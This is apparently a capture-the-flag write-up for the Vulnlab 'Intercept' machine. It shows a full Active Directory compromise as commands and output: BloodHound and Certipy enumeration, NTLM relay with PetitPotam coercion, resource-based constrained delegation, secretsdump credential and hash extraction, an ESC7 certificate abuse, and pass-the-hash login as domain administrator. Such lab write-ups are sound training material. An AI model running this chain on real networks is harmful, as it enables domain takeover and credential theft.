No luck with password spraying? Meh, it happens. Time to switch gears and **map the domain** using **BloodHound CE (Community Edition) with Python** instead of SharpHound! No need for an interactive Windows session just pure Python magic. Let’s gather AD data, analyze relationships, and hunt for privilege escalation paths. **Time to unleash bloodhound-python and see what the domain is hiding!** 🐺🔥

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# bloodhound-ce-python -d intercept.vl -u 'KATHRYN.SPENCER' -p 'Chocolate1' -c all -ns 10.10.186.69  
INFO: BloodHound.py for BloodHound Community Edition  
INFO: Found AD domain: intercept.vl  
INFO: Getting TGT for user  
INFO: Connecting to LDAP server: dc01.intercept.vl  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 2 computers  
INFO: Connecting to LDAP server: dc01.intercept.vl  
INFO: Found 14 users  
INFO: Found 55 groups  
INFO: Found 2 gpos  
INFO: Found 4 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: WS01.intercept.vl  
INFO: Querying computer: DC01.intercept.vl  
INFO: Done in 01M 54S
```

![](https://cdn-images-1.medium.com/max/1200/1*qYYxRm0fBXXhZiQrkJN-XA.png)

Nothing too exciting from BloodHound, but wait **we’ve got an AD Certificate Services (ADCS) server!** 🎯

One of the first things I do when I have **valid credentials** is **check for ADCS misconfigurations** because they can lead to some nasty privilege escalation. For this, we can use either **netexec** or **Certipy** to enumerate certificate templates and potential attack vectors. Let’s dig in and see if we can forge ourselves a golden ticket! 🏆

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# certipy-ad find -u 'Simon.Bowen' -p 'b0OI_fHO859+Aw' -vulnerable -stdout -dc-ip 10.10.186.69 -debug  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[+] Authenticating to LDAP server  
[+] Bound to ldaps://10.10.186.69:636 - ssl  
[+] Default path: DC=intercept,DC=vl  
[+] Configuration path: CN=Configuration,DC=intercept,DC=vl  
[+] Adding Domain Computers to list of current user's SIDs  
[+] List of current user's SIDs:  
INTERCEPT.VL\Authenticated Users (INTERCEPT.VL-S-1-5-11)  
INTERCEPT.VL\intercept-users (S-1-5-21-3031021547-1480128195-3014128932-1104)  
INTERCEPT.VL\Domain Users (S-1-5-21-3031021547-1480128195-3014128932-513)  
INTERCEPT.VL\Users (INTERCEPT.VL-S-1-5-32-545)  
INTERCEPT.VL\Simon Bowen (S-1-5-21-3031021547-1480128195-3014128932-1112)  
INTERCEPT.VL\helpdesk (S-1-5-21-3031021547-1480128195-3014128932-1116)  
INTERCEPT.VL\Domain Computers (S-1-5-21-3031021547-1480128195-3014128932-515)  
INTERCEPT.VL\Everyone (INTERCEPT.VL-S-1-1-0)  
[*] Finding certificate templates  
[*] Found 33 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 11 enabled certificate templates  
[+] Trying to resolve 'DC01.intercept.vl' at '10.10.186.69'  
[*] Trying to get CA configuration for 'intercept-DC01-CA' via CSRA  
[+] Trying to get DCOM connection for: 10.10.186.69  
[!] Got error while trying to get CA configuration for 'intercept-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.  
[*] Trying to get CA configuration for 'intercept-DC01-CA' via RRP  
[!] Failed to connect to remote registry. Service should be starting now. Trying again...  
[+] Connected to remote registry at 'DC01.intercept.vl' (10.10.186.69)  
[*] Got CA configuration for 'intercept-DC01-CA'  
[+] Resolved 'DC01.intercept.vl' from cache: 10.10.186.69  
[+] Connecting to 10.10.186.69:80  
[*] Enumeration output:  
Certificate Authorities  
0  
CA Name : intercept-DC01-CA  
DNS Name : DC01.intercept.vl  
Certificate Subject : CN=intercept-DC01-CA, DC=intercept, DC=vl  
Certificate Serial Number : 42CBF42BC20F189241BEE6BB7BE8F0A0  
Certificate Validity Start : 2023-06-27 13:24:59+00:00  
Certificate Validity End : 2125-03-24 20:18:28+00:00  
Web Enrollment : Disabled  
User Specified SAN : Disabled  
Request Disposition : Issue  
Enforce Encryption for Requests : Enabled  
Permissions  
Owner : INTERCEPT.VL\Administrators  
Access Rights  
Enroll : INTERCEPT.VL\Authenticated Users  
ManageCa : INTERCEPT.VL\ca-managers  
INTERCEPT.VL\Domain Admins  
INTERCEPT.VL\Enterprise Admins  
INTERCEPT.VL\Administrators  
ManageCertificates : INTERCEPT.VL\Domain Admins  
INTERCEPT.VL\Enterprise Admins  
INTERCEPT.VL\Administrators  
Certificate Templates : [!] Could not find any certificate templates
```

Next up, I started poking around for **DC misconfigurations** because, well, that’s just what we do. One of my go-to moves is running the **ldap-checker** module in **Netexec** because if **LDAP signing isn’t enforced**, things can go downhill fast for the defenders. And guess what? **Boom! LDAP signing is not enforced!**

This means that, under the right conditions, we can **pull off an LDAP relay attack** and completely take over a domain computer. Now that’s what I call a game-changer. Let’s get to work!

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# nxc smb hosts -u 'KATHRYN.SPENCER' -p 'Chocolate1' -M webdav  
SMB 10.10.186.70 445 WS01 [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)  
SMB 10.10.186.69 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)  
SMB 10.10.186.70 445 WS01 [+] intercept.vl\KATHRYN.SPENCER:Chocolate1  
WEBDAV 10.10.186.70 445 WS01 WebClient Service enabled on: 10.10.186.70  
SMB 10.10.186.69 445 DC01 [+] intercept.vl\KATHRYN.SPENCER:Chocolate1  
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00  
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# nxc ldap hosts -u 'KATHRYN.SPENCER' -p 'Chocolate1' -M ldap-checker  
SMB 10.10.186.69 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)  
LDAP 10.10.186.69 389 DC01 [+] intercept.vl\KATHRYN.SPENCER:Chocolate1  
LDAP-CHE... 10.10.186.69 389 DC01 LDAP Signing NOT Enforced!  
LDAP-CHE... 10.10.186.69 389 DC01 LDAPS Channel Binding is set to "NEVER"  
SMB 10.10.186.70 445 NONE [*] x64 (name:) (domain:) (signing:False) (SMBv1:False)  
LDAP 10.10.186.70 389 NONE [-] \KATHRYN.SPENCER:Chocolate1 Error connecting to the domain, are you sure LDAP service is running on the target?  
Error: [Errno 110] Connection timed out  
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

![](https://cdn-images-1.medium.com/max/800/1*TRJZyKFTazjMp1qAuXBJ5w.png)

So, what’s the big deal here? Well, the **WebClient service** lets us remotely **coerce HTTP authentication** from a domain computer. And why do we need **HTTP authentication**? Because **SMB to LDAP relays won’t work** thanks to **MIC (Message Integrity Check)** throwing a wrench in our plans.

But that’s not all we also need an **SPN (Service Principal Name)** as part of the **RBCD (Resource-Based Constrained Delegation) attack**. Once we **modify the **`msDS-AllowedToActOnBehalfOfOtherIdentity`** attribute** on our target via the relay, we need an SPN to **delegate to the target device**. Luckily, **domain computers are automatically registered with SPNs**, and if the **Machine Account Quota (MAQ) is greater than zero**, we can just **create our own SPN** and move forward with the attack. Now, let’s make some magic happen! , you can see that in future bloodhound as mentioned in that bloodhound recap

Amm, we **already know** WebClient is enabled from the **Netexec module**, and the **Machine Account Quota (MAQ) is set to 10**, so you know what that means **time for an NTLM relay attack with PetitPotam!**

But hold on, there’s one small problem… **we don’t know if HTTP authentication can actually reach our machine** yet. And you know what that means? **We need to add our machine to the domain’s DNS records!** Lucky for us, we have **domain user privileges**, so we can get that done.

For this, I’ll be using **dnstool.py** from **Dirkjanm’s toolkit** (part of [**krbrelayx** ](https://github.com/dirkjanm/krbrelayx)repo). Let’s set things up and get this relay rolling!

Alright, so here’s the deal **to retrieve the coerced authentication**, our host **needs to be in an intranet zone**, be **a domain-joined machine**, or have **a valid DNS entry** in the domain. Since we **already have a domain user**, we can add our own machine to DNS and make it look legit.

But here’s the trick: **dnstool.py** requires a valid machine name for the DNS entry. So, to get one, I’ll **fire up Responder with HTTP disabled** and **note down the hostname** it generates for us. Once we have that, we’ll use **dnstool.py** from the **krbrelayx repo** to add our fake machine to the domain. With that in place, we’re all set to run **PetitPotam** and force that sweet NTLM authentication our way!

1. **Modify **`responder.conf` → Set `HTTP = Off` and `SMB = Off` to prevent interference.
2. **Start Responder** and grab the hostname it generates.
3. **Use **`dnstool.py` from **krbrelayx** to add the hostname as a valid DNS entry in the domain.
4. **Fire up **`ntlmrelayx` to relay the coerced authentication to LDAP.
5. **Launch PetitPotam** to force the target machine to authenticate to our relay.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# responder -I tun1  
__  
.----.-----.-----.-----.-----.-----.--| |.-----.----.  
| _| -__|__ --| _ | _ | | _ || -__| _|  
|__| |_____|_____| __|_____|__|__|_____||_____|__|  
|__|  
  
NBT-NS, LLMNR & MDNS Responder 3.1.5.0  
  
To support this project:  
Github -> https://github.com/sponsors/lgandx  
Paypal -> https://paypal.me/PythonResponder  
  
Author: Laurent Gaffie (laurent.gaffie@gmail.com)  
To kill this script hit CTRL-C  
  
  
[+] Poisoners:  
LLMNR [ON]  
NBT-NS [ON]  
MDNS [ON]  
DNS [ON]  
DHCP [OFF]  
  
[+] Servers:  
HTTP server [OFF]  
HTTPS server [ON]  
WPAD proxy [OFF]  
Auth proxy [OFF]  
SMB server [OFF]  
Kerberos server [ON]  
SQL server [ON]  
FTP server [ON]  
IMAP server [ON]  
POP3 server [ON]  
SMTP server [ON]  
DNS server [ON]  
LDAP server [ON]  
MQTT server [ON]  
RDP server [ON]  
DCE-RPC server [ON]  
WinRM server [ON]  
SNMP server [OFF]  
  
[+] HTTP Options:  
Always serving EXE [OFF]  
Serving EXE [OFF]  
Serving HTML [OFF]  
Upstream Proxy [OFF]  
  
[+] Poisoning Options:  
Analyze Mode [OFF]  
Force WPAD auth [OFF]  
Force Basic Auth [OFF]  
Force LM downgrade [OFF]  
Force ESS downgrade [OFF]  
  
[+] Generic Options:  
Responder NIC [tun1]  
Responder IP [10.8.5.124]  
Responder IPv6 [fe80::6a29:96c:f4b9:180]  
Challenge set [random]  
Don't Respond To Names ['ISATAP', 'ISATAP.LOCAL']  
Don't Respond To MDNS TLD ['_DOSVC']  
TTL for poisoned response [default]  
  
[+] Current Session Variables:  
Responder Machine Name [WIN-10TTZGQZ8RS]  
Responder Domain Name [Y8GH.LOCAL]  
Responder DCE-RPC Port [48689]  
  
[+] Listening for events...
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/krbrelayx]  
└─# python3 dnstool.py -u 'intercept.vl\KATHRYN.SPENCER' -p Chocolate1 --action add --record WIN-10TTZGQZ8RS.intercept.vl --data 10.8.5.124 --type A 10.10.186.69  
  
[-] Connecting to host...  
[-] Binding to host  
[+] Bind OK  
[-] Adding new record  
[+] LDAP operation completed successfully
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# impacket-ntlmrelayx -t ldaps://10.10.186.69 --delegate-access -smb2support  
  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Protocol Client LDAPS loaded..  
[*] Protocol Client LDAP loaded..  
[*] Protocol Client RPC loaded..  
[*] Protocol Client MSSQL loaded..  
[*] Protocol Client SMB loaded..  
[*] Protocol Client HTTP loaded..  
[*] Protocol Client HTTPS loaded..  
[*] Protocol Client DCSYNC loaded..  
[*] Protocol Client IMAP loaded..  
[*] Protocol Client IMAPS loaded..  
[*] Protocol Client SMTP loaded..  
[*] Running in relay mode to single host  
[*] Setting up SMB Server on port 445  
[*] Setting up HTTP Server on port 80  
[*] Setting up WCF Server on port 9389  
[*] Setting up RAW Server on port 6666  
[*] Multirelay disabled  
  
[*] Servers started, waiting for connections  
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.186.70, attacking target ldaps://10.10.186.69  
[*] HTTPD(80): Client requested path: /randomfile.txt/pipe/srvsvc  
[*] HTTPD(80): Client requested path: /randomfile.txt/pipe/srvsvc  
[*] HTTPD(80): Connection from 10.10.186.70 controlled, attacking target ldaps://10.10.186.69  
[*] HTTPD(80): Client requested path: /randomfile.txt/pipe/srvsvc  
[*] HTTPD(80): Authenticating against ldaps://10.10.186.69 as INTERCEPT/WS01$ SUCCEED  
[*] Enumerating relayed user's privileges. This may take a while on large domains  
[*] HTTPD(80): Client requested path: /randomfile.txt/pipe/srvsvc  
[*] HTTPD(80): Client requested path: /randomfile.txt/pipe/srvsvc  
[*] All targets processed!  
[*] HTTPD(80): Connection from 10.10.186.70 controlled, but there are no more targets left!  
[*] Attempting to create computer in: CN=Computers,DC=intercept,DC=vl  
[*] Adding new computer with username: IKIFWZLH$ and password: Xfv1LnwK/hD9Hdc result: OK  
[*] Delegation rights modified succesfully!
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/PetitPotam]  
└─# python3 PetitPotam.py -d "intercept.vl" -u "KATHRYN.SPENCER" -p "Chocolate1" WIN-10TTZGQZ8RS@80/randomfile.txt 10.10.186.70  
  
/home/kali/Desktop/vulnlab/intercept/PetitPotam/PetitPotam.py:20: SyntaxWarning: invalid escape sequence '\ '  
show_banner = '''  
  
  
___ _ _ _ ___ _  
| _ \ ___ | |_ (_) | |_ | _ \ ___ | |_ __ _ _ __  
| _/ / -_) | _| | | | _| | _/ / _ \ | _| / _` | | ' \  
_|_|_ \___| _\__| _|_|_ _\__| _|_|_ \___/ _\__| \__,_| |_|_|_|  
_| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|  
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'  
  
PoC to elicit machine account authentication via some MS-EFSRPC functions  
by topotam (@topotam77)  
  
Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN  
  
  
  
Trying pipe lsarpc  
[-] Connecting to ncacn_np:10.10.186.70[\PIPE\lsarpc]  
[+] Connected!  
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e  
[+] Successfully bound!  
[-] Sending EfsRpcOpenFileRaw!  
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!  
[+] OK! Using unpatched function!  
[-] Sending EfsRpcEncryptFileSrv!  
[+] Got expected ERROR_BAD_NETPATH exception!!  
[+] Attack worked!
```

![](https://cdn-images-1.medium.com/max/1200/1*y9xBE5sjeRaKsbbMkNNQqQ.png)

Yeah, **PetitPotam** can be a stubborn beast! It either works like a charm or makes you question your life choices. No worries, I’ll keep my patience in check while dealing with its random tantrums.

Let’s stick to the plan:

- **Try different coercion techniques** if PetitPotam keeps ghosting us.
- **Make sure our relaying target actually allows delegation** (otherwise, we’re just running in circles).

> If things go south, we’ll debug step by step, but hey hacking isn’t hacking without a little pain, right?

Yep, time for the final boss move! We’ll verify if everything lined up correctly by checking WS01’s attributes with **impacket**-**rbcd**. If the **msDS-AllowedToActOnBehalfOfOtherIdentity** attribute is set, then boom we’ve got ourselves a juicy RBCD attack ready to roll.

Now, if everything went smoothly (which, let’s be honest, it rarely does), we should have full control over WS01. If not… well, time to troubleshoot and yell at the screen for a bit. 😆

```bash
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/PetitPotam]  
└─# impacket-rbcd -delegate-from 'IKIFWZLH$' -delegate-to 'WS01$' -dc-ip 10.10.186.69 -action 'read' 'intercept'/'IKIFWZLH$':'Xfv1LnwK/hD9Hdc'  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Accounts allowed to act on behalf of other identity:  
[*] IKIFWZLH$ (S-1-5-21-3031021547-1480128195-3014128932-4101)
```

Time to **summon that TGT** using `impacket-getST`. If all went well with RBCD, we should be able to request a **service ticket as Administrator** on WS01 and elevate our access.

Let’s run `getST`, grab the **Administrator’s TGT**, and use it to **take over the system like a boss**. If this fails, well… guess we’re back to debugging and cursing at our terminal. 😆

```bash
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/PetitPotam]  
└─# impacket-getST -spn 'cifs/WS01.intercept.vl' -impersonate Administrator -dc-ip 10.10.186.69 'intercept'/'IKIFWZLH$':'Xfv1LnwK/hD9Hdc'  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[-] CCache file is not found. Skipping...  
[*] Getting TGT for user  
[*] Impersonating Administrator  
/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
now = datetime.datetime.utcnow()  
/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
now = datetime.datetime.utcnow() + datetime.timedelta(days=1)  
[*] Requesting S4U2self  
/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
now = datetime.datetime.utcnow()  
/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).  
now = datetime.datetime.utcnow() + datetime.timedelta(days=1)  
[*] Requesting S4U2Proxy  
[*] Saving ticket in Administrator@cifs_WS01.intercept.vl@INTERCEPT.VL.ccache  
  
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/PetitPotam]  
└─# export KRB5CCNAME=./Administrator@cifs_WS01.intercept.vl@INTERCEPT.VL.ccache  
  
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/PetitPotam]  
└─# klist  
Ticket cache: FILE:./Administrator@cifs_WS01.intercept.vl@INTERCEPT.VL.ccache  
Default principal: Administrator@intercept  
  
Valid starting Expires Service principal  
03/24/2025 19:34:24 03/25/2025 05:34:21 cifs/WS01.intercept.vl@INTERCEPT.VL  
renew until 03/25/2025 19:34:21
```

Now that we’ve got the **Administrator TGT**, it’s time to **extract credentials**. We can use `secretsdump.py` to dump hashes from the **SAM, SYSTEM, and SECURITY hives** for further exploitation.

Alternatively, `netexec` can be used with the TGT to execute commands directly on the target, providing another method to escalate control over the system.

```bash
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/PetitPotam]  
└─# impacket-secretsdump administrator@WS01.intercept.vl -k -no-pass  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Service RemoteRegistry is in stopped state  
[*] Service RemoteRegistry is disabled, enabling it  
[*] Starting service RemoteRegistry  
[*] Target system bootKey: 0x04718518c7f81484a5ba5cc7f16ca912  
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:831cbc509daa37aff98250b635e7f482:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:48daaaaa9654c3754d42b40e292ba63f:::  
[*] Dumping cached domain logon information (domain/username:hash)  
INTERCEPT.VL/Simon.Bowen:$DCC2$10240#Simon.Bowen#35e1bb1dbd5f474e21819bb03ae5d103: (2023-06-27 20:07:12)  
INTERCEPT.VL/Kathryn.Spencer:$DCC2$10240#Kathryn.Spencer#4d8e1b44d30998c82793a9808b959d91: (2023-06-29 11:51:33)  
[*] Dumping LSA Secrets  
[*] $MACHINE.ACC  
INTERCEPT\WS01$:plain_password_hex:dc1f9347b8991311fe5c9139dd94d1e10e71c5239e7131f430917f243c3a11c0c915cea5ee89d1a2ee1381a873194e17a3b15906c7f705bed3d02d4ee64faa19abdbc574cf8365e384ccf7093aa9fbd708e57c47bb649db0dd4ecd13cefe5ea4f5dca73ce79ec3e08e141d4efb2028673824e179b65bf65fa90f340f980eb1bd5db007632b3bcbb302617fe12ae64a10b825027431a449833a00225bf008f7f15df402e5bb0148f639a1d4927685d353b1d0cf14136c931f6ecefe4aaf5be7e7a28208c352b81b1bd049c196bbe6993d49eda6927d73ff4be5b556f90a404988b4ea6d204c750c753cd4076a65988175  
INTERCEPT\WS01$:aad3b435b51404eeaad3b435b51404ee:6c094ad622ae7f332630296f5e89e405:::  
[*] DefaultPassword  
intercept.vl\Kathryn.Spencer:Chocolate1  
[*] DPAPI_SYSTEM  
dpapi_machinekey:0xf6f65580470c139808ab7f0ffb709773d1531dc3  
dpapi_userkey:0x24122e60857c28b7f2e6bdd138f22e3e4ddd58f3  
[*] NL$KM  
0000 4C A8 6F 51 3B B6 E6 22 0B A7 7A FD 4F 32 EA BC L.oQ;.."..z.O2..  
0010 78 7A 98 1E DD 83 F2 70 37 73 9B 6C D0 03 9B 7F xz.....p7s.l....  
0020 FA EA 8D AF A0 84 F9 0D 24 17 3C C9 97 3D 8A E7 ........$.<..=..  
0030 BC EE 5D B7 20 73 02 B7 E1 A7 62 E6 4D 8E F8 ED ..]. s....b.M...  
NL$KM:4ca86f513bb6e6220ba77afd4f32eabc787a981edd83f27037739b6cd0039b7ffaea8dafa084f90d24173cc9973d8ae7bcee5db7207302b7e1a762e64d8ef8ed  
[*] _SC_HelpdeskService  
Simon.Bowen@intercept.vl:REdactedw  
[*] Cleaning up...  
[*] Stopping service RemoteRegistry  
[*] Restoring the disabled state for service RemoteRegistry
```

![](https://cdn-images-1.medium.com/max/800/0*ZU9PQBPWe5UG_fLV.gif)

Damn, it’s not every day you see a **cleartext password** straight from the SAM dump this is some serious damage! 🔥 Now, let’s **add this owned user into BloodHound** and analyze the attack paths. Time to see what kind of chaos we can unleash as **Simon** and what new attack surfaces open up for us!

![](https://cdn-images-1.medium.com/max/1200/1*KYQis6pk-Hy9doJ1TnHeEA.png)

![](https://cdn-images-1.medium.com/max/1200/1*KlAfNZcj1vim5CfOZBlJcA.png)

![](https://cdn-images-1.medium.com/max/1200/1*iTYNrROKxo_n5DrRM-zOIQ.png)

Simon is **way** better than Kathryn! This dude has an **awesome** attack path he’s a **Helpdesk member**, and guess what? That group has **GenericAll** on the **CA-Manager** group. This means we might have a juicy **AD CS attack** waiting for us. Let’s dig in and see how far we can push this!

![](https://cdn-images-1.medium.com/max/800/1*jsAosMzYglO35wWVQPxAuw.png)

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# impacket-owneredit -action write -target 'ca-managers' -new-owner 'Simon.Bowen' 'intercept.vl'/'Simon.Bowen':'REdacted+Aw' -dc-ip 10.10.186.69  
  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Current owner information below  
[*] - SID: S-1-5-21-3031021547-1480128195-3014128932-512  
[*] - sAMAccountName: Domain Admins  
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=intercept,DC=vl  
[*] OwnerSid modified successfully!
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# impacket-dacledit -action 'write' -rights 'FullControl' -principal 'Simon.Bowen' -target 'ca-managers' 'intercept.vl'/'Simon.Bowen':'REdacted+Aw' -dc-ip 10.10.186.69  
  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] DACL backed up to dacledit-20250324-195916.bak  
[*] DACL modified successfully!
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# net rpc group addmem 'ca-managers' 'Simon.Bowen' -U intercept.vl/Simon.Bowen -S DC01.intercept.vl  
  
Password for [INTERCEPT.VL\Simon.Bowen]:
```

Last step: You can use BloodyAD for that.

Now Simon is supposed to be part of the CA-Manager group, but if you want to verify that, you can use Netexec to check the group members of CA-Manager. You’ll see that Simon is now part of this group.

Now that Simon is in the CA-Managers group, we can exploit ESC7, as identified in the Certipy find output. Since we have control over the CA, we can add ourselves as an officer, granting the ability to approve our own certificate requests including those that let us impersonate the Domain Admin.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# certipy-ad ca -ca 'INTERCEPT-DC01-CA' -add-officer 'Simon.Bowen' -u 'Simon.Bowen@intercept.vl' -p 'REdacted+Aw' -dc-ip 10.10.186.69  
  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Successfully added officer 'Simon.Bowen' on 'INTERCEPT-DC01-CA'
```

Now, let’s enumerate the certificate templates to verify if **SubCA** is enabled.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/vulnlab/intercept]  
└─# certipy-ad ca -u "Simon.Bowen@intercept.vl" -p "REdacted+Aw" -dc-ip "10.10.186.69" -ca 'INTERCEPT-DC01-CA' -list-templates  
  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Enabled certificate templates on 'INTERCEPT-DC01-CA':  
DirectoryEmailReplication  
DomainControllerAuthentication  
KerberosAuthentication  
EFSRecovery  
EFS  
DomainController  
WebServer  
Machine  
User  
SubCA  
Administrator
```

Even though the certificate request for the Administrator using the **SubCA** template will be denied, we can still retain the private key.

```bash
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/PetitPotam]  
└─# certipy-ad req -u 'Simon.Bowen@intercept.vl' -p 'b0OI_fHO859+Aw' -ca INTERCEPT-DC01-CA -dc-ip 10.10.186.69 -template SubCA -upn administrator@intercept.vl  
  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for thi  
s type of certificate.  
[*] Request ID is 5  
Would you like to save the private key? (y/N) y  
[*] Saved private key to 5.key  
[-] Failed to request certificate  
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/PetitPotam]  
└─# certipy-ad ca -ca 'INTERCEPT-DC01-CA' -issue-request 5 -u 'Simon.Bowen@intercept.vl' -p 'b0OI_fHO859+Aw' -dc-ip 10.10.186.69  
  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Successfully issued certificate  
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/PetitPotam]  
└─# certipy-ad req -ca 'INTERCEPT-DC01-CA' -retrieve 5 -u 'Simon.Bowen@intercept.vl' -p 'b0OI_fHO859+Aw' -dc-ip 10.10.186.69 -debug  
  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Rerieving certificate with ID 5  
[+] Trying to connect to endpoint: ncacn_np:10.10.186.69[\pipe\cert]  
[+] Connected to endpoint: ncacn_np:10.10.186.69[\pipe\cert]  
[*] Successfully retrieved certificate  
[*] Got certificate with UPN 'administrator@intercept.vl'  
[*] Certificate has no object SID  
[*] Loaded private key from '5.key'  
[*] Saved certificate and private key to 'administrator.pfx'  
  
root㉿kali)-[/home/…/Desktop/vulnlab/intercept/PetitPotam]  
└─# certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'intercept.vl' -dc-ip 10.10.186.69  
  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Using principal: administrator@intercept.vl  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saved credential cache to 'administrator.ccache'  
[*] Trying to retrieve NT hash for 'administrator'  
[*] Got hash for 'administrator@intercept.vl': a----------51404eeaad3b435b51404ee:ad95c338a6---------  
  
┌──(root㉿kali)-[/home/…/Desktop/vulnlab/intercept/PetitPotam]  
└─# evil-winrm -i 10.10.186.69 -u administrator -H ad95c338a6cc---------  
  
  
Evil-WinRM shell v3.7  
  
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop  
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls
```

We successfully obtained our certificate, requested it, and extracted the NT hash. With that, we authenticated using the hash and finally **pwned** the domain!

![](https://cdn-images-1.medium.com/max/800/0*0XR_zyqurOetizHV.gif)

This machine wasn’t a straightforward scenario, but I learned a lot from it, especially about NTLM relay, ESC7, and relay attack chains. The best part? It’s now mapped in BloodHound, meaning you can visualize the attack paths clearly. I hope I explained the steps in a way that makes sense because this wasn’t an easy ride for me. Hopefully, you picked up something useful from this write-up. **Happy hacking!**

*Write-up made with love by Mohamed Eletrepy aka Maverick* ❤️

---

### References & Further Reading

<div class="video-embed"><iframe src="https://www.youtube.com/embed/buSyt3vZRuk" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

<div class="video-embed"><iframe src="https://www.youtube.com/embed/MJ5Cz5jFb5w" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

